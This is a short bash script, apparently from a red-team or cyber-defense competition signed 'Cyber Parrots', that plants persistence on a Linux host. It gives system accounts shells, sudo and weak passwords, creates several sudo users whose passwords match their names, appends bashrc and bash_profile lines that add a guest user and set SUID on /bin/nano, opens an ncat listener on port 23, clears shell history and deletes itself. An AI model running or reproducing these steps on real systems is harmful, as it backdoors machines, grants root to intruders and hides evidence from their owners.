#var tmp/
cd /tmp/

#make parrot file
cat > cyberparrots.txt << "EOF"
            .------.
           /  ~ ~   \,------.      ______
         ,'  ~ ~ ~  /  (@)   \   ,'      \
       ,'          /`.    ~ ~ \ /         \
     ,'           | ,'\  ~ ~ ~ X     \  \  \
   ,'  ,'          V--<       (       \  \  \
 ,'  ,'               (vv      \/\  \  \  |  |
(__,'  ,'   /         (vv   ""    \  \  | |  |
  (__,'    /   /       vv   """    \ |  / / /
      \__,'   /  |     vv          / / / / /
          \__/   / |  | \         / /,',','
             \__/\_^  |  \       /,'',','\
                    `-^.__>.____/  ' ,'   \
                            // //---'      |
          ===============(((((((=================
                                     | \ \  \
        Good Luck !!!                / |  |  \
          Cyber Parrots             / /  / \  \
          - Silas Shen              `.     |   \
                                      `--------'
EOF

#copy parrot to subdirectories
for d in /*; do cp /tmp/cyberparrots.txt "$d"; done

#add users and sudo
usermod --shell /bin/bash daemon
usermod --shell /bin/bash sys
usermod --shell /bin/bash games
usermod -aG sudo daemon
usermod -aG sudo sys
usermod -aG sudo games

echo 'daemon:password1' | chpasswd
echo 'sys:password1' | chpasswd
echo 'games:password1' | chpasswd

useradd joe && echo "joe:joe" | chpasswd
useradd matthew && echo "matthew:matthew" | chpasswd
useradd ben && echo "ben:ben" | chpasswd
useradd silas && echo "silas:silas" | chpasswd
useradd stubblefield && echo "stubblefield:stubblefield" | chpasswd
useradd cyberparrot && echo "cyberparrot:cyberparrot" | chpasswd

usermod -aG sudo joe
usermod -aG sudo matthew
usermod -aG sudo ben
usermod -aG sudo silas
usermod -aG sudo stubblefield
usermod -aG sudo cyberparrot

#start bash persistence with guest user
sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano" >> ~/.bash_profile
sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano" >> ~/.bashrc


#netcat
ncat --tcp -lvp 23


#crontab ?????
#crontab -l | { cat; echo "*/1 * * * * sudo /etc/init.d/ssh start"; } | crontab -

#hide crontab ???

#kill history
history -c

#kill self
rm -rf linux.sh